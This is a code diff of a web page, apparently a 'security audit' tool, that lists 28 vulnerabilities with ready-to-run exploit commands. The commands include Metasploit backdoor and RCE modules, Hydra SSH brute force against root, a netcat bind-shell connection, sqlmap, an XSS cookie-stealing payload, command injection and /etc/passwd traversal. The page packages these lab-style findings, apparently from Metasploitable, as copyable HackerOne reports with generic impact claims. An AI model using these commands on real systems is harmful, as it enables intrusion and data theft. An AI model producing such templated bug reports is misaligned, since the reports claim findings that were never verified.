@@ -3,30 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DRAK24EVIL | Professional Audit</title>
+    <title>DRAK24EVIL | Professional Security Audit</title>
     <style>
         :root { --accent: #3b82f6; --bg: #0f172a; --card: #1e293b; --text: #f8fafc; --crit: #ef4444; }
         body { background: var(--bg); color: var(--text); font-family: sans-serif; margin: 0; padding: 0; }
-        
-        /* Header */
         header { background: #1e293b; padding: 20px; border-bottom: 1px solid #334155; display: flex; justify-content: space-between; align-items: center; }
         .logo { font-weight: 800; color: var(--accent); font-size: 1.2rem; }
-        
-        /* Grid */
         .container { max-width: 1200px; margin: 40px auto; padding: 0 20px; }
         .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
-        
-        /* Card */
         .card { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 20px; cursor: pointer; transition: 0.3s; }
         .card:hover { border-color: var(--accent); transform: translateY(-5px); box-shadow: 0 10px 20px rgba(0,0,0,0.3); }
         .badge { font-size: 0.7rem; background: rgba(239, 68, 68, 0.2); color: var(--crit); padding: 4px 8px; border-radius: 4px; font-weight: bold; float: right; }
-        
-        /* Modal */
         .modal { display: none; position: fixed; z-index: 999; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); overflow-y: auto; }
         .modal-content { background: #0f172a; margin: 5% auto; padding: 30px; width: 90%; max-width: 700px; border-radius: 20px; border: 1px solid var(--accent); }
         .close { float: right; font-size: 30px; cursor: pointer; color: #64748b; }
-        
-        /* Report Style */
         .label { color: var(--accent); font-weight: bold; font-size: 0.8rem; text-transform: uppercase; display: block; margin-top: 20px; }
         .box { background: #1e293b; padding: 15px; border-radius: 8px; margin-top: 5px; border: 1px solid #334155; font-size: 0.9rem; color: #cbd5e1; line-height: 1.6; }
         .code { background: #000; color: #38bdf8; padding: 15px; border-radius: 8px; font-family: monospace; margin-top: 10px; border-left: 4px solid var(--accent); word-break: break-all; }
@@ -48,34 +38,48 @@
     <div class="modal-content">
         <span class="close" onclick="closeM()">&times;</span>
         <div id="reportArea"></div>
-        <button class="copy-btn" onclick="copyReport()">COPY FULL REPORT</button>
+        <button class="copy-btn" onclick="copyReport()">COPY FULL HACKERONE REPORT</button>
     </div>
 </div>
 
 <script>
-// Full database including 28 vulnerability templates
 const data = [
-    { p:"21", n:"vsftpd 2.3.4 Backdoor", s:"Critical", t:"Nmap, Metasploit", sum:"Remote code execution via malicious backdoor in the source code.", steps:"1. Connect to port 21\n2. User 'anonymous:)'\n3. Connect to port 6200", e:"use exploit/unix/ftp/vsftpd_234_backdoor", imp:"Full Root Access" },
-    { p:"22", n:"SSH Brute Force", s:"High", t:"Hydra", sum:"Credential stuffing against SSH service.", steps:"1. Use rockyou.txt\n2. Run hydra against target\n3. Login via SSH", e:"hydra -l root -P pass.txt [IP] ssh", imp:"Remote System Access" },
-    { p:"139", n:"Samba Usermap Script", s:"Critical", t:"Metasploit", sum:"Remote command execution via username mapping.", steps:"1. Configure RHOSTS\n2. Run exploit\n3. Execute commands", e:"exploit/multi/samba/usermap_script", imp:"Full root compromise" },
-    { p:"1524", n:"Ingreslock Shell", s:"Critical", t:"Netcat", sum:"Unauthenticated bind shell listening on port 1524.", steps:"1. Connect via NC\n2. Run 'id' command", e:"nc [TARGET] 1524", imp:"Immediate shell access" },
-    { p:"3306", n:"MySQL No Password", s:"High", t:"MySQL-Client", sum:"Root database user has no password.", steps:"1. Connect to MySQL\n2. Extract user data", e:"mysql -h [IP] -u root", imp:"Database Leak" },
-    { p:"WEB", n:"SQL Injection", s:"Critical", t:"Sqlmap", sum:"Data theft via vulnerable URL parameters.", steps:"1. Locate vuln URL\n2. Run sqlmap --dbs", e:"sqlmap -u [URL] --batch --dbs", imp:"Full DB Takeover" },
-    { p:"WEB", n:"XSS Reflected", s:"High", t:"Burp Suite", sum:"Malicious script execution in user browser.", steps:"1. Inject <script>\n2. Capture cookies", e:"<script>alert(document.cookie)</script>", imp:"Account Takeover" },
-    { p:"WEB", n:"LFI Traversal", s:"High", t:"Web Browser", sum:"Accessing internal system files via directory traversal.", steps:"1. Use ../../../\n2. Read /etc/passwd", e: "/etc/passwd", imp:"System Info Leak" },
-    { p:"WEB", n:"Command Injection", s:"Critical", t:"Netcat", sum:"OS Command execution via web form.", steps:"1. Use ; operator\n2. Run 'cat /etc/passwd'", e: "; id; whoami", imp:"OS Takeover" }
-    // Add the rest of your 28 items here in the same format
+    { p:"21", n:"vsftpd 2.3.4 Backdoor", s:"Critical", t:"Nmap, Metasploit", sum:"Remote code execution via malicious backdoor.", steps:"1. Scan port 21\n2. Trigger via user:)\n3. Shell on 6200", e:"use exploit/unix/ftp/vsftpd_234_backdoor", imp:"Root Access" },
+    { p:"22", n:"SSH Brute Force", s:"High", t:"Hydra", sum:"Weak credentials allow system entry.", steps:"1. Run Hydra\n2. Check rockyou.txt\n3. SSH login", e:"hydra -l root -P pass.txt [IP] ssh", imp:"User Access" },
+    { p:"23", n:"Telnet Access", s:"High", t:"Telnet", sum:"Unencrypted default credentials.", steps:"1. Telnet [IP]\n2. login msfadmin:msfadmin", e:"telnet [IP]", imp:"Cleartext Leak" },
+    { p:"25", n:"SMTP Enumeration", s:"Med", t:"Smtp-user-enum", sum:"User disclosure via VRFY.", steps:"1. Scan SMTP\n2. Enum users", e:"smtp-user-enum -M VRFY -U users.txt", imp:"Info Leak" },
+    { p:"53", n:"DNS Zone Transfer", s:"Med", t:"Dig", sum:"Full internal host disclosure.", steps:"1. dig axfr @[IP]", e:"dig axfr @[IP]", imp:"Recon" },
+    { p:"80", n:"PHP CGI RCE", s:"Critical", t:"Metasploit", sum:"Query string execution.", steps:"1. Attack PHP-CGI handler", e:"exploit/multi/http/php_cgi_arg_injection", imp:"System RCE" },
+    { p:"111", n:"RPC Bind Leak", s:"Low", t:"Nmap", sum:"RPC program disclosure.", steps:"1. rpcinfo -p [IP]", e:"rpcinfo -p [IP]", imp:"Recon" },
+    { p:"139", n:"Samba Usermap", s:"Critical", t:"Metasploit", sum:"Username mapping RCE.", steps:"1. Run usermap exploit", e:"exploit/multi/samba/usermap_script", imp:"Root Shell" },
+    { p:"445", n:"SMB Null Session", s:"High", t:"Enum4linux", sum:"Anonymous share access.", steps:"1. enum4linux -a [IP]", e:"enum4linux -a [IP]", imp:"Data Theft" },
+    { p:"512", n:"Rexec Trust", s:"High", t:"Rlogin", sum:"Passwordless root login.", steps:"1. rlogin -l root", e:"rlogin -l root [IP]", imp:"Root Access" },
+    { p:"513", n:"Rlogin Access", s:"High", t:"R-tools", sum:"Login via .rhosts trust.", steps:"1. Connect rlogin", e:"rlogin [IP]", imp:"System Shell" },
+    { p:"514", n:"Rsh Shell", s:"High", t:"Netcat", sum:"Rsh command execution.", steps:"1. rsh -l root [IP] id", e:"rsh -l root [IP] id", imp:"RCE" },
+    { p:"1099", n:"Java RMI RCE", s:"Critical", t:"Metasploit", sum:"RMI Registry exploit.", steps:"1. Attack 1099", e:"exploit/multi/misc/java_rmi_server", imp:"Full Access" },
+    { p:"1524", n:"Ingreslock Shell", s:"Critical", t:"Netcat", sum:"Bind shell on 1524.", steps:"1. nc [IP] 1524", e:"nc [IP] 1524", imp:"Root Access" },
+    { p:"2049", n:"NFS Mount Leak", s:"High", t:"Showmount", sum:"Unsecured file exports.", steps:"1. showmount -e\n2. Mount locally", e:"mount -t nfs [IP]:/ /mnt", imp:"Data Leak" },
+    { p:"2121", n:"ProFTPD Backdoor", s:"Critical", t:"Metasploit", sum:"Source code backdoor.", steps:"1. Attack 2121", e:"exploit/unix/ftp/proftpd_133c_backdoor", imp:"Root Shell" },
+    { p:"3306", n:"MySQL No Pass", s:"High", t:"MySQL Client", sum:"Root has no password.", steps:"1. mysql -u root", e:"mysql -h [IP] -u root", imp:"DB Leak" },
+    { p:"3632", n:"Distccd RCE", s:"Critical", t:"Metasploit", sum:"Distributed compiler exploit.", steps:"1. Run distcc_exec", e:"exploit/unix/misc/distcc_exec", imp:"RCE" },
+    { p:"5432", n:"Postgres UDF", s:"Critical", t:"Metasploit", sum:"SQL command execution.", steps:"1. Run postgres_payload", e:"exploit/linux/postgres/postgres_payload", imp:"System RCE" },
+    { p:"5900", n:"VNC No Auth", s:"High", t:"VNCviewer", sum:"Open visual session.", steps:"1. Connect VNC", e:"vncviewer [IP]", imp:"Desktop Takeover" },
+    { p:"6667", n:"UnrealIRCd", s:"Critical", t:"Metasploit", sum:"IRC daemon backdoor.", steps:"1. Run unreal exploit", e:"exploit/unix/irc/unreal_ircd_3281_backdoor", imp:"Root Access" },
+    { p:"8080", n:"TikiWiki RCE", s:"High", t:"Metasploit", sum:"Web formula exploit.", steps:"1. Attack 8080", e:"exploit/multi/http/tikiwiki_graph_formula_exec", imp:"Server Access" },
+    { p:"8180", n:"Tomcat Deploy", s:"Critical", t:"Metasploit", sum:"WAR file upload RCE.", steps:"1. Deploy shell.war", e:"exploit/multi/http/tomcat_mgr_deploy", imp:"Root Shell" },
+    { p:"WEB", n:"SQL Injection", s:"Critical", t:"Sqlmap", sum:"DB data extraction.", steps:"1. sqlmap --dbs", e:"sqlmap -u [URL] --dbs", imp:"Full DB Leak" },
+    { p:"WEB", n:"XSS Reflected", s:"High", t:"Burp", sum:"Client-side script execution.", steps:"1. Inject <script>", e:"<script>alert(1)</script>", imp:"Cookie Theft" },
+    { p:"WEB", n:"LFI Traversal", s:"High", t:"Browser", sum:"Reading /etc/passwd.", steps:"1. Read file traversal", e:"../../etc/passwd", imp:"Info Disclosure" },
+    { p:"WEB", n:"Command Injection", s:"Critical", t:"Burp", sum:"OS command execution.", steps:"1. Use ; or | operators", e:"; cat /etc/passwd", imp:"System Takeover" },
+    { p:"WEB", n:"WebDAV Upload", s:"High", t:"Cadaver", sum:"Malicious file upload.", steps:"1. cadaver upload", e:"cadaver [URL]", imp:"Webshell Access" }
 ];
 
 const grid = document.getElementById('mainGrid');
-
-// Using a standard loop to prevent JavaScript crashes
 for (let i = 0; i < data.length; i++) {
     const item = data[i];
     const d = document.createElement('div');
     d.className = 'card';
     d.innerHTML = '<span class="badge">' + item.s + '</span><small style="color:#3b82f6">PORT ' + item.p + '</small><h3>' + item.n + '</h3>';
-    
     d.onclick = function() {
         document.getElementById('reportArea').innerHTML = 
             '<h2 style="color:#3b82f6">' + item.n + '</h2>' +
@@ -84,7 +88,6 @@ for (let i = 0; i < data.length; i++) {
             '<span class="label">Steps To Reproduce:</span><div class="box">' + item.steps + '</div>' +
             '<span class="label">Exploit Command:</span><div class="code">' + item.e + '</div>' +
             '<span class="label">Impact:</span><div class="box" style="border-left:4px solid red">' + item.imp + '</div>';
-        
         document.getElementById('reportModal').style.display = 'block';
     };
     grid.appendChild(d);
@@ -93,18 +96,13 @@ for (let i = 0; i < data.length; i++) {
 function copyReport() {
     const text = document.getElementById('reportArea').innerText;
     const temp = document.createElement('textarea');
-    temp.value = text;
-    document.body.appendChild(temp);
-    temp.select();
-    document.execCommand('copy');
+    temp.value = text; document.body.appendChild(temp);
+    temp.select(); document.execCommand('copy');
     document.body.removeChild(temp);
     alert('HackerOne Report Copied!');
 }
-
 function closeM() { document.getElementById('reportModal').style.display = 'none'; }
-window.onclick = function(event) {
-    if (event.target == document.getElementById('reportModal')) { closeM(); }
-}
+window.onclick = function(e) { if (e.target == document.getElementById('reportModal')) closeM(); }
 </script>
 </body>
 </html>
